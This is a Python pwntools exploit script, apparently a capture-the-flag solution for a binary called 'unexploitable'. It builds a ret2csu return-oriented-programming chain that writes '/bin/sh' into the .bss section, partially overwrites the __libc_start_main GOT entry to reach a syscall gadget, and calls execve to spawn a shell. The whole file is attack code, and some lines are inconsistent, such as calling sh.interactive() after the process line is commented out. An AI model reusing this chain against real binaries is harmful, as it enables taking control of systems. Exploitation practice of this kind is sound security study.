from pwn import *


ret2csu_pops             = p64(0x00000000004005e6)
ret2csu_rdx_rsi_edi      = p64(0x0000000000400580) #  mov rdx, r15; mov rsi, r14; mov edi, r13d
read_plt                 = p64(0x0000000000400430)
read_got                 = p64(0x0000000000601000)
__libc_start_main_got    = p64(0x0000000000601008)
binsh_bss                = p64(0x0000000000601900)

fd = open("a.txt", "wr")


#sh = process("strace ./unexploitable")
payload = "A" * 24

# place the string "/bin/sh" on the bss section
payload += ret2csu_pops
payload += p64(0) # 8-byte padding
payload += p64(0) # rbx
payload += p64(0) # rbp
payload += p64(0) # r12
payload += p64(0) # r13: STDIN
payload += binsh_bss # r14
payload += p64(7) # r15
payload += ret2csu_rdx_rsi_edi
payload += read_plt

# overwrite the first 2 bytes of the address of __libc_start_main
payload += ret2csu_pops
payload += p64(0) # 8-byte padding
payload += p64(0) # rbx
payload += p64(0) # rbp
payload += p64(0) # r12
payload += p64(0) # r13: STDIN
payload += __libc_start_main_got # r14
payload += p64(2) # r15
payload += ret2csu_rdx_rsi_edi
payload += read_plt

# continue execution to execve("/bin/sh")
payload += ret2csu_pops
payload += p64(0) # 8-byte padding
payload += p64(0) # rbx
payload += p64(0) # rbp
payload += p64(0) # r12
payload += p64(0) # r13
payload += binsh_bss # r14
payload += p64(59) # r15 
payload += ret2csu_rdx_rsi_edi
payload += __libc_start_main_got



#print("stage 1!")
payload2 = "/bin/sh"
#sh.send(payload2)
#print("stage 2!")
payload3 = "\xb2\x28" # mov eax, edx; syscall
#sh.send(payload3)
#print("stage 3!")
fd.write(payload + "\n" + payload2 + payload3)
sh.interactive()